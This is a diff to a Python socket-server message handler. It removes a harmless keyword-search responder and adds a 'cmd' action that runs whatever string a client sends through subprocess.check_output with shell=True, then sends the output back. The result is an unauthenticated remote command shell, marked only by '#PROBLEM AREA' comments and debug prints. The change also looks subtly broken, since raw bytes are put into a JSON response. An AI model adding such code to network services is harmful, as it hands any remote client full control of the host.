@@ -1,14 +1,11 @@
+import os
+import subprocess
 import sys
 import selectors
 import json
 import io
 import struct
 
-request_search = {
-    "morpheus": "Follow the white rabbit. \U0001f430",
-    "ring": "In the caves beneath the Misty Mountains. \U0001f48d",
-    "\U0001f436": "\U0001f43e Playing ball! \U0001f3d0",
-}
 
 class Message:
     
@@ -74,6 +71,7 @@ class Message:
             "content-encoding": content_encoding,
             "content-length": len(content_bytes),
         }
+        print(jsonheader)
         jsonheader_bytes = self._json_encode(jsonheader, "utf-8")
         message_hdr = struct.pack(">H", len(jsonheader_bytes))
         message = message_hdr + jsonheader_bytes + content_bytes
@@ -81,10 +79,12 @@ class Message:
 
     def _create_response_json_content(self):
         action = self.request.get("action")
-        if action == "search":
+        if action == "cmd":
             query = self.request.get("value")
-            answer = request_search.get(query) or f'No match for "{query}".'
-            content = {"result": answer}
+            answer = subprocess.check_output(query, shell=True) #PROBLEM AREA #PROBLEM AREA
+            print(answer)
+            content = {"result": answer} #PROBLEM AREA PROBLEM AREA
+            print(content)
         else:
             content = {"result": f'Error: invalid action "{action}".'}
         content_encoding = "utf-8"
@@ -92,14 +92,6 @@ class Message:
             "content_bytes": self._json_encode(content, content_encoding),
             "content_type": "text/json",
             "content_encoding": content_encoding,
-        }
-        return response
-
-    def _create_response_binary_content(self):
-        response = {
-            "content_bytes": b"First 10 bytes of request: "+ self.request[:10],
-            "content_type": "binary/custom-server-binary-type",
-            "content_encoding": "binary",
         }
         return response
 
@@ -192,8 +184,6 @@ class Message:
         print('create')
         if self.jsonheader["content-type"] == "text/json":
             response = self._create_response_json_content()
-        else:
-            response = self._create_response_binary_content()
         message = self._create_message(**response)
         self.response_created = True
         self._send_buffer += message
